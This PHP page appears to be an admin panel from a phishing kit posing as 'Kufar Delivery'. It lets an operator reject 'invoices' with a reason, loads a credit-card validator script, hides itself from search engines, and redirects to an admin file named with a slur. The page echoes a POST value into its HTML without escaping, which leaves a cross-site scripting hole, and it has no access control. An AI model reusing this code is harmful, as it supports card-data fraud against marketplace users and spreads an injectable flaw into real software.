<?php
include '../system/main.php';

if ($_SERVER['REQUEST_METHOD'] != 'POST' || !isset($_POST['id'])) {
    die();
}

if(isset($_POST['reason'])) {
    $query = "UPDATE invoices SET status = 3, reason = '". $connection->real_escape_string($_POST['reason']) ."' WHERE id  = '". (int)$_POST['id'] ."'";
    $connection->query($query);
    header('Location: adminpidoras228.php');
}

?>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Куфар Доставка</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="css/main.css">

</head>
<body>
<div class="container py-5">
    <div class="row">
        <div class="col-lg-7 mx-auto">
            <div id="not"></div>
            <div class="bg-white rounded-lg shadow-lg p-5">
                <div class="tab-content">
                    <div id="nav-tab-card" class="tab-pane fade show active">
                        <form role="form" method="post">
                            <div class="form-group">
                                <label for="reason">Причина</label>
                                <input type="text" name="reason" required=""
                                       class="form-control">
                                <input type="hidden" name="id" value="<?php echo $_POST['id']; ?>">
                            </div>
                            <button type="submit" class="subscribe btn btn-success btn-block shadow-sm">
                                Подтвердить
                            </button>
                        </form>
                    </div>

                </div>

            </div>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js" integrity="sha256-+4KHeBj6I8jAKAU8xXRMXXlH+sqCvVCoK5GAFkmb+2I=" crossorigin="anonymous"></script>

<script src="js/jquery.creditCardValidator.js"></script>

<?php echo '<script type="text/javascript" src="js/main.js?'. time() .'"></script>' ?>

</body>
</html>